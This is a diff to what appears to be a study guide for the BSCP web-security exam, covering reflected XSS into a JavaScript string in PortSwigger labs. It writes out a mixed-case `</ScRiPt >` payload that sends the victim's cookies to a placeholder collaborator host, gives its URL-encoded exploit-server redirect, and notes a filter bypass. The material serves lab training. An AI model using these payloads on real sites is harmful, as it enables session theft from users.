@@ -478,7 +478,7 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 
 ### Reflected String XSS  
 
->Submitting a search string and reviewing the `source code` of the search result page, the JavaScript string variable is ***identified*** to reflect the search string `tracker.gif` in the `source code` variable named `searchTerms`.  
+>Submitting a search string and reviewing the `source code` of the search result page, the JavaScript string variable is ***identified*** to reflect the search string `tracker.gif` in the `source code` with a variable named `searchTerms`.  
 
 ```html
 <section class=blog-header>
@@ -517,15 +517,21 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
   
 [PortSwigger Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)  
   
->In BSCP exam host the below payload on exploit server inside `<script>` tags, and the search query is `</ScRiPt ><img src=a onerror=document.location="https://COLLABORATOR.com/?biscuit="+document.cookie>` before it is URL encoded below.  
+>In BSCP exam host the below payload on exploit server inside `<script>` tags, and the search query below before it is URL encoded.  
+
+```
+</ScRiPt ><img src=a onerror=document.location="https://COLLABORATOR.com/?biscuit="+document.cookie>
+```  
+
+>Exploit Server hosting search term reflected vulnerability that is send to victim to obtain their session cookie.  
 
 ```html
 <script>
 location = "https://TARGET.net/?search=%3C%2FScRiPt+%3E%3Cimg+src%3Da+onerror%3Ddocument.location%3D%22https%3A%2F%2FCOLLABORATOR.com%2F%3Fbiscuit%3D%22%2Bdocument.cookie%3E"
 </script>
-
 ```  
 
+>The application gave error message `Tag is not allowed`, and this is bypassed using this `</ScRiPt >`.  
 
 ### Reflected String Extra Escape  
 
